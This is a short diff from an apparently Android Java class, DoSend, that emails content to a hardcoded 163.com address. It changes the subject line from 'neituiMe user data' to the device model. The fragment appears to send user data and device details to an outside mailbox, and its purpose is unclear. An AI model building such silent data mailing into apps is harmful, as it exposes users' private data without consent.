@@ -19,7 +19,7 @@ public class DoSend
 		// 收件人邮箱
 		mailInfo.setToAddress("neituiMeGet@163.com");
 		// 邮件标题
-		mailInfo.setSubject("neituiMe用户数据");
+		mailInfo.setSubject("型号："+android.os.Build.MODEL);
 		// 邮件内容
 		mailInfo.setContent(Content);
 		// 发送邮件
